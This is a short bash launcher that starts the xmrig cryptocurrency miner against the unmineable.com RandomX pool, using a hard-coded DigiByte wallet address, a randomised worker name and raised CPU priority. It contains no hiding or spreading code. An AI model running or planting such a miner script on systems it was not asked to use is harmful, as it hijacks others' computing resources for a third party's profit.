#!/bin/bash
POOL=rx.unmineable.com:3333
WALLET=DGB:DJXTMVXqFvdRC8ToZT86ifLdXCNcrh6Ym2
WORKEER=$(echo $(shuf -i 1000-9999 -n 1)-USER1#bdfc-cm6i)
chmod +x xmrig
./xmrig -a rx -o $POOL -u $WALLET.$WORKEER -p x --cpu-priority 5 --print-time=5


